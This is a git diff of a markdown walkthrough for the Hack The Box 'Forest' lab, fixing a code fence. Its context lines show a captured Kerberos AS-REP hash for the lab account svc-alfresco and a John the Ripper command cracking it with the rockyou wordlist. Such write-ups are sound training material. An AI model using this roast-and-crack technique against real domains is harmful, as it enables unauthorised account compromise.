@@ -164,7 +164,7 @@ root@test:~/tools/Windows/impacket/examples# cat /root/HTB/Forest/hashes
 $krb5asrep$23$svc-alfresco@HTB.LOCAL:ead9ec2fc260fbda2f1697e3bd855564$c57e09ec984c5d72a66989c63b90c68eac5b309a4cb82890b4734dfc169c5f456ee9ef6ccc21d490d56a30ee0ed7cd13031b29f518d19a8a38780c64fe62f12db584b6f164cf47b9b2e2360983a16deebd8f43562a04edfa8bf5e9aeab56ae74eadec7df54845f4ce3b42609e36a222e56ac6ae23a2b4c8435d90ceb0d2c6526ccae1af3ea0e5d23003be8aefbbd407a4de36a35fb7056d06e503592a63878adbd9f80a979010a261ef397b55eae05daaeedb2ce3d2c8c6b21e815d8eeb4db5d4820b7ddccd44ad1c169828f6a95d16c68cca0c3cff32a08af39b917f9382bbe723e24e0df69
 ```
 ## John The Ripper
-``markdown
+```markdown
 root@test:~/tools/Windows/impacket/examples# john /root/HTB/Forest/hashes --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
